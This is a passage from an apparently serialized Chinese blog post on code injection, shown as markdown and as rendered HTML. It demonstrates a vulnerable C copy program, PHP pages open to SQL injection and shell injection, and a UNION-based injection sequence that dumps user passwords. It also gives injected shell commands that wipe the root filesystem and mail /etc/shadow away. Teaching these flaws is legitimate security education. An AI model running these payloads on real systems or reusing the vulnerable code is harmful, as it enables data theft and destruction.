$query);\n\nif( $result && mysqli_num_rows( $result ) == 1 ) {\n\t$row    = mysqli_fetch_assoc( $result );\n\t$avatar = $row[\"avatar\"];\n\n\techo \"<p>Welcome to the password protected area {$user}</p>\";\n\techo \"<img src=\\\"{$avatar}\\\" />\";\n}\nelse {\n\techo \"<pre><br />Username and/or password incorrect.</pre>\";\n}\n\nmysqli_close($conn);\n?>\n```\n\n`sql.php`\n``` php\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n        <title>SQL 注入</title>\n    </head>\n    <body>\n        <?php\n        if ($_POST[content]) {\n            $db_host = \"localhost\";\n\t\t\t$db_user = \"my_user\";\n\t\t\t$db_password = \"my_password\";\n\t\t\t$db_name = \"my_db\";\n            $content = $_POST[content];\n            $query = \"SELECT first_name,last_name FROM users WHERE user_id = '$content'\";\n\n            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n            $result = mysqli_query($conn, $query);\n\n            if (mysqli_num_rows($result)) {\n                while ($row = mysqli_fetch_array($result)) {\n                \t$first = $row[\"first_name\"];\n\t\t\t$last  = $row[\"last_name\"];\n\n\t\t\techo \"<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>\"; \n                }\n            } else {\n                echo \"No Found!\";\n            }\n            mysqli_close($conn);\n        } else {\n            var_dump($_POST);\n            echo \"Don't get your content!\";\n        }\n        ?>\n    </body>\n</html>\n```\n\n`user.html`\n``` html\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n\t<style>\n  \t\tdiv{\n\t\t    border:1px;\n\t\t    width:400px;\n\t\t    margin:20px auto;\n\t\t  }\n\t</style>\n        <title>sql 注入测试</title>\n    </head>\n    <body>\n        <div class=\"card\">\n            <div class=\"card-body\">\n\t\t<h2>Login</h2>\n\n\t\t<form action=\"medium.php\" method=\"POST\">\n\t\t\tUsername:<br>\n\t\t\t<input type=\"text\" class=\"form-control\" name=\"username\" placeholder=\"username\">\n\t\t\tPassword:<br>\n\t\t\t<input type=\"password\" class=\"form-control\" name=\"password\" placeholder=\"password\">\n\t\t\t<br>\n\t\t\t<button type=\"submit\" class=\"btn btn-primary\">Login</button>\n\t\t</form>\n\t</div>\n        </div>\n    </body>\n</html>\n```\n\n### 初步注入\n``` bash\n1' or '1'='1\n```\n\n### 猜测查询语句的字段数\n即要对查询语句\n``` sql\nSELECT first_name,last_name FROM users WHERE user_id = '$content'\n```\n中的`SELECT`字段进行猜测\n``` bash\n1' or 1=1 order by 1 #\n1' or 1=1 order by 2 #\n1' or 1=1 order by 3 #\n```\n尝试到3时出现`No Found`说明`SELECT`里有两个字段数\n\n### 查询刚刚猜测的字段顺序\n``` bash\n1' union select 1,2 #\n```\n`sql`语法`union`是将两个集合去重合并，相当于原本返回`admin,admin`，现在又存在`1,2`，通过`union`后就是两行数据\n\n### 获取当前数据库名\n``` bash\n1' union select 1,database() #\n```\n`database()`是数据库系统信息函数，作用是获取当前数据库名，其他数据库信息函数有\n\n| 函数 | 作用 |\n|--------|--------|\n| version()       |     获取数据库的版本号 |\n| connection_id() |   获取数据库的连接数   |\n| database();schema() |  获取当前数据库名  |\n| user();system_user()|  获取当前用户     |\n| current_user()  |    \t获取当前用户      |\n| charset(str)    |    获取字符串str的字符集 |\n| collation(str)  |    获取字符串str的字符排列方式 |\n\n### 获取当前表名\n``` bash\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n```\n`mysql`在创建时默认创建一个information_schema数据库，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。\n\n`information_schema`数据库表说明:\n- `SCHEMATA`表：提供了当前mysql实例中所有数据库的信息。`show databases`的结果取之此表。\n- `TABLES`表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。`show tables from schemaname`的结果取之此表。\n- `COLUMNS`表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。`show columns from schemaname.tablename`的结果取之此表。\n- `STATISTICS`表：提供了关于表索引的信息。`show index from schemaname.tablename`的结果取之此表。\n- `USER_PRIVILEGES`（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。\n- `VIEWS`表：给出了关于数据库中的视图的信息。需要有`show views`权限，否则无法查看视图信息\n- `TRIGGERS`表：提供了关于触发程序的信息。必须有super权限才能查看该表\n\n\n### 获取当前表字段名\n``` bash\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n```\n\n### 获取所有数据\n``` bash\n1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #\n```\n\n### 视频\n\n{% youtube UwJr-RsEy58 %}\n\n## php 注入\n``` php\n<?php\nprint(\"查看文件\");\nprint(\"<p>\");\n$file=$_GET['filename'];\nsystem(\"cat $file\");\n?>\n```\n\n与c代码注入类似，基本在于调用系统的命令来获取结果，诸如php获取系统版本、mysql版本、服务器时间、Web服务器类型等等系统信息，使用系统命令，都可能会产生注入漏洞。在本例中仍然可以在url中注入一些系统命令。\n\n## 注入防范\n明白注入的基本方式和原理，很容易知道，通过输入检查来预防注入。获取到输入的字符串，对字符串进行过滤、转义等操作，只不过诸如php的不同输入检查函数，不同的函数的检查方法不一样，但有可能仍然存在编写者本身没有考虑到的可能性，这就导致了漏洞不间断出现。在使用这些检查函数时，要认真查看函数的检查方法以及过滤的东西。在此举个例子:\n\n`mysqli_real_escape_string( mysqli $link , string $escapestr)`:\n- Parameters:\n\t- link: Procedural style only: A link identifier returned by mysqli_connect() or mysqli_init()\n\t- escapestr: The string to be escaped. Characters encoded are NUL (ASCII 0), \\n, \\r, \\, ', \", and Control-Z.\n- Return Value:\n\t- Returns an escaped string.\n\n``` php\n<?php\n$mysqli = new mysqli(\"localhost\", \"my_user\", \"my_password\", \"world\");\n\n/* check connection */\nif (mysqli_connect_errno()) {\n    printf(\"Connect failed: %s\\n\", mysqli_connect_error());\n    exit();\n}\n\n$mysqli->query(\"CREATE TEMPORARY TABLE myCity LIKE City\");\n\n$city = \"'s Hertogenbosch\";\n\n/* this query will fail, cause we didn't escape $city */\nif (!$mysqli->query(\"INSERT into myCity (Name) VALUES ('$city')\")) {\n    printf(\"Error: %s\\n\", $mysqli->sqlstate);\n}\n\n$city = $mysqli->real_escape_string($city);\n\n/* this query with escaped $city will work */\nif ($mysqli->query(\"INSERT into myCity (Name) VALUES ('$city')\")) {\n    printf(\"%d Row inserted.\\n\", $mysqli->affected_rows);\n}\n\n$mysqli->close();\n?>\n```\n\n## 引用地址\n- [http://www.freebuf.com/articles/web/120747.html](http://www.freebuf.com/articles/web/120747.html)\n- [http://topspeedsnail.com/hack-command-injection-attack/](http://topspeedsnail.com/hack-command-injection-attack/)","source":"_posts/代码注入.md","raw":"---\ntitle: 代码注入\ndate: 2017-12-14 15:18:23\ncategories: 安全\ntags:\n  - centos\n  - 代码注入\n---\n\n## c程序代码注入\nc程序:\n``` bash\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n\tchar src[100], dst[100], cmd[205] = \"cp \";\n\tprintf(\"Please enter name of source file:\");\n\tgets(src);\n\tstrcat(cmd, src);\n\tstrcat(cmd, \" \");\n\tprintf(\"Please enter name of destination file:\");\n\tgets(dst);\n\tstrcat(cmd, dst);\n\tsystem(cmd);\n\treturn 0;\n}\n```\n<!--more-->\n程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:\n![](/images/attacks.png)\n\n异常代码注入\n![](/images/attacks2.png)\n\n同时还能干这些事情\n删除根目录，你可以试试\n``` shell\ncp hello world; rm -rf / --no-preserve-root\n```\n将linux系统的密码文件通过邮件发送\n``` shell\ncp hello world; mail ****@****.com < /etc/shadow\n```\n\n## SQL代码注入\n`index.html`\n``` html\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n        <title>sql 注入测试</title>\n    </head>\n    <body>\n        <div class=\"card\" style=\"width: 20rem;\">\n            <div class=\"card-body\">\n                <form method=\"POST\" action=\"index.php\">\n                    <div class=\"form-group\">\n                    <label class=\"col-form-label\" for=\"formGroupExampleInput\">SQL query</label>\n                    <input type=\"text\" class=\"form-control\" name=\"content\" id=\"content\" placeholder=\"Example input\">\n                    </div>\n                    <button type=\"submit\" class=\"btn btn-primary\">Submit</button>\n                </form>\n            </div>\n        </div>\n    </body>\n</html>\n```\n`index.php`\n``` php\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n        <title>SQL 注入</title>\n    </head>\n    <body>\n        <?php\n        if ($_POST[content]) {\n            $db_host = \"localhost\";\n            $db_user = \"my_user\";\n            $db_password = \"my_password\";\n            $db_name = \"my_db\";\n            $content = $_POST[content];\n            $query = \"SELECT * FROM users WHERE name = '$content'\";\n\n            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n            $result = mysqli_query($conn, $query);\n\n            var_dump();\n            if (mysqli_num_rows($result)) {\n                while ($row = mysqli_fetch_array($result)) {\n                    echo \"Your name is \" . $row[1] . \"</br>\";\n\n                }\n            } else {\n                echo \"No Found!\";\n            }\n            mysqli_close($conn);\n        } else {\n            var_dump($_POST);\n            echo \"Don't get your content!\";\n        }\n        ?>\n    </body>\n</html>\n```\n表中数据\n![](/images/sql1.png)\n正常输入\n![](/images/sql2.png)\n![](/images/sql3.png)\n![](/images/sql4.png)\n![](/images/sql5.png)\n异常输入\n![](/images/sql6.png)\n![](/images/sql7.png)\n\n问题在于`SELECT * FROM users WHERE name = '$content'`在接收前端输入的字符串时，直接拼接查询语句,当输入为`hello' OR 1=1 #`时,将语句拼接完成就是`SELECT * FROM users WHERE name = 'hello' OR 1=1 #'`,其中`hello`后的一个单引号将查询语句的第一个单引号关闭了,接下来就是`OR`语句的真子句,最后将多余的单引号注释掉,那么这个查询永远为真,查询语句就会将数据库中所有的数据都返回。\n\n## SQL注入续\n`low.php`\n``` php\n<?php\n\n$db_host = \"localhost\";\n$db_user = \"my_user\";\n$db_password = \"my_password\";\n$db_name = \"my_db\";\n\n$user = $_POST[ 'username' ];\n\n$pass = $_POST[ 'password' ];\n$pass = md5( $pass );\n\n$query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n$result = mysqli_query($conn, $query);\n\nif( $result && mysqli_num_rows( $result ) == 1 ) {\n\t$row    = mysqli_fetch_assoc( $result );\n\t$avatar = $row[\"avatar\"];\n\n\techo \"<p>Welcome to the password protected area {$user}</p>\";\n\techo \"<img src=\\\"{$avatar}\\\" />\";\n}\nelse {\n\techo \"<pre><br />Username and/or password incorrect.</pre>\";\n}\n\nmysqli_close($conn);\n?>\n```\n\n`medium.php`\n``` php\n<?php\n\n$db_host = \"localhost\";\n$db_user = \"my_user\";\n$db_password = \"my_password\";\n$db_name = \"my_db\";\n$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n\n$user = $_POST[ 'username' ];\n\n$pass = $_POST[ 'password' ];\n$user = mysqli_real_escape_string($conn, $user);\n$pass = mysqli_real_escape_string($conn, $pass);\n$pass = md5( $pass );\n\n$query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n$result = mysqli_query($conn, $query);\n\nif( $result && mysqli_num_rows( $result ) == 1 ) {\n\t$row    = mysqli_fetch_assoc( $result );\n\t$avatar = $row[\"avatar\"];\n\n\techo \"<p>Welcome to the password protected area {$user}</p>\";\n\techo \"<img src=\\\"{$avatar}\\\" />\";\n}\nelse {\n\techo \"<pre><br />Username and/or password incorrect.</pre>\";\n}\n\nmysqli_close($conn);\n?>\n```\n\n`sql.php`\n``` php\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n        <title>SQL 注入</title>\n    </head>\n    <body>\n        <?php\n        if ($_POST[content]) {\n            $db_host = \"localhost\";\n\t\t\t$db_user = \"my_user\";\n\t\t\t$db_password = \"my_password\";\n\t\t\t$db_name = \"my_db\";\n            $content = $_POST[content];\n            $query = \"SELECT first_name,last_name FROM users WHERE user_id = '$content'\";\n\n            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n            $result = mysqli_query($conn, $query);\n\n            if (mysqli_num_rows($result)) {\n                while ($row = mysqli_fetch_array($result)) {\n                \t$first = $row[\"first_name\"];\n\t\t\t$last  = $row[\"last_name\"];\n\n\t\t\techo \"<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>\"; \n                }\n            } else {\n                echo \"No Found!\";\n            }\n            mysqli_close($conn);\n        } else {\n            var_dump($_POST);\n            echo \"Don't get your content!\";\n        }\n        ?>\n    </body>\n</html>\n```\n\n`user.html`\n``` html\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n\t<style>\n  \t\tdiv{\n\t\t    border:1px;\n\t\t    width:400px;\n\t\t    margin:20px auto;\n\t\t  }\n\t</style>\n        <title>sql 注入测试</title>\n    </head>\n    <body>\n        <div class=\"card\">\n            <div class=\"card-body\">\n\t\t<h2>Login</h2>\n\n\t\t<form action=\"medium.php\" method=\"POST\">\n\t\t\tUsername:<br>\n\t\t\t<input type=\"text\" class=\"form-control\" name=\"username\" placeholder=\"username\">\n\t\t\tPassword:<br>\n\t\t\t<input type=\"password\" class=\"form-control\" name=\"password\" placeholder=\"password\">\n\t\t\t<br>\n\t\t\t<button type=\"submit\" class=\"btn btn-primary\">Login</button>\n\t\t</form>\n\t</div>\n        </div>\n    </body>\n</html>\n```\n\n### 初步注入\n``` bash\n1' or '1'='1\n```\n\n### 猜测查询语句的字段数\n即要对查询语句\n``` sql\nSELECT first_name,last_name FROM users WHERE user_id = '$content'\n```\n中的`SELECT`字段进行猜测\n``` bash\n1' or 1=1 order by 1 #\n1' or 1=1 order by 2 #\n1' or 1=1 order by 3 #\n```\n尝试到3时出现`No Found`说明`SELECT`里有两个字段数\n\n### 查询刚刚猜测的字段顺序\n``` bash\n1' union select 1,2 #\n```\n`sql`语法`union`是将两个集合去重合并，相当于原本返回`admin,admin`，现在又存在`1,2`，通过`union`后就是两行数据\n\n### 获取当前数据库名\n``` bash\n1' union select 1,database() #\n```\n`database()`是数据库系统信息函数，作用是获取当前数据库名，其他数据库信息函数有\n\n| 函数 | 作用 |\n|--------|--------|\n| version()       |     获取数据库的版本号 |\n| connection_id() |   获取数据库的连接数   |\n| database();schema() |  获取当前数据库名  |\n| user();system_user()|  获取当前用户     |\n| current_user()  |    \t获取当前用户      |\n| charset(str)    |    获取字符串str的字符集 |\n| collation(str)  |    获取字符串str的字符排列方式 |\n\n### 获取当前表名\n``` bash\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n```\n`mysql`在创建时默认创建一个information_schema数据库，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。\n\n`information_schema`数据库表说明:\n- `SCHEMATA`表：提供了当前mysql实例中所有数据库的信息。`show databases`的结果取之此表。\n- `TABLES`表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。`show tables from schemaname`的结果取之此表。\n- `COLUMNS`表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。`show columns from schemaname.tablename`的结果取之此表。\n- `STATISTICS`表：提供了关于表索引的信息。`show index from schemaname.tablename`的结果取之此表。\n- `USER_PRIVILEGES`（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。\n- `VIEWS`表：给出了关于数据库中的视图的信息。需要有`show views`权限，否则无法查看视图信息\n- `TRIGGERS`表：提供了关于触发程序的信息。必须有super权限才能查看该表\n\n\n### 获取当前表字段名\n``` bash\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n```\n\n### 获取所有数据\n``` bash\n1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #\n```\n\n### 视频\n\n{% youtube UwJr-RsEy58 %}\n\n## php 注入\n``` php\n<?php\nprint(\"查看文件\");\nprint(\"<p>\");\n$file=$_GET['filename'];\nsystem(\"cat $file\");\n?>\n```\n\n与c代码注入类似，基本在于调用系统的命令来获取结果，诸如php获取系统版本、mysql版本、服务器时间、Web服务器类型等等系统信息，使用系统命令，都可能会产生注入漏洞。在本例中仍然可以在url中注入一些系统命令。\n\n## 注入防范\n明白注入的基本方式和原理，很容易知道，通过输入检查来预防注入。获取到输入的字符串，对字符串进行过滤、转义等操作，只不过诸如php的不同输入检查函数，不同的函数的检查方法不一样，但有可能仍然存在编写者本身没有考虑到的可能性，这就导致了漏洞不间断出现。在使用这些检查函数时，要认真查看函数的检查方法以及过滤的东西。在此举个例子:\n\n`mysqli_real_escape_string( mysqli $link , string $escapestr)`:\n- Parameters:\n\t- link: Procedural style only: A link identifier returned by mysqli_connect() or mysqli_init()\n\t- escapestr: The string to be escaped. Characters encoded are NUL (ASCII 0), \\n, \\r, \\, ', \", and Control-Z.\n- Return Value:\n\t- Returns an escaped string.\n\n``` php\n<?php\n$mysqli = new mysqli(\"localhost\", \"my_user\", \"my_password\", \"world\");\n\n/* check connection */\nif (mysqli_connect_errno()) {\n    printf(\"Connect failed: %s\\n\", mysqli_connect_error());\n    exit();\n}\n\n$mysqli->query(\"CREATE TEMPORARY TABLE myCity LIKE City\");\n\n$city = \"'s Hertogenbosch\";\n\n/* this query will fail, cause we didn't escape $city */\nif (!$mysqli->query(\"INSERT into myCity (Name) VALUES ('$city')\")) {\n    printf(\"Error: %s\\n\", $mysqli->sqlstate);\n}\n\n$city = $mysqli->real_escape_string($city);\n\n/* this query with escaped $city will work */\nif ($mysqli->query(\"INSERT into myCity (Name) VALUES ('$city')\")) {\n    printf(\"%d Row inserted.\\n\", $mysqli->affected_rows);\n}\n\n$mysqli->close();\n?>\n```\n\n## 引用地址\n- [http://www.freebuf.com/articles/web/120747.html](http://www.freebuf.com/articles/web/120747.html)\n- [http://topspeedsnail.com/hack-command-injection-attack/](http://topspeedsnail.com/hack-command-injection-attack/)","slug":"代码注入","published":1,"updated":"2017-12-22T10:15:42.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd06003cyp0lzrczy6b2","content":"<h2 id=\"c程序代码注入\"><a href=\"#c程序代码注入\" class=\"headerlink\" title=\"c程序代码注入\"></a>c程序代码注入</h2><p>c程序:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char *argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar src[100], dst[100], cmd[205] = <span class=\"string\">\"cp \"</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter name of source file:\"</span>);</span><br><span class=\"line\">\tgets(src);</span><br><span class=\"line\">\tstrcat(cmd, src);</span><br><span class=\"line\">\tstrcat(cmd, <span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter name of destination file:\"</span>);</span><br><span class=\"line\">\tgets(dst);</span><br><span class=\"line\">\tstrcat(cmd, dst);</span><br><span class=\"line\">\tsystem(cmd);</span><br><span class=\"line\">\t<span class=\"built_in\">return</span> 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:<br><img src=\"/images/attacks.png\" alt=\"\"></p>\n<p>异常代码注入<br><img src=\"/images/attacks2.png\" alt=\"\"></p>\n<p>同时还能干这些事情<br>删除根目录，你可以试试<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp hello world; rm -rf / --no-preserve-root</span><br></pre></td></tr></table></figure></p>\n<p>将linux系统的密码文件通过邮件发送<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp hello world; mail ****@****.com &lt; /etc/shadow</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"SQL代码注入\"><a href=\"#SQL代码注入\" class=\"headerlink\" title=\"SQL代码注入\"></a>SQL代码注入</h2><p><code>index.html</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span 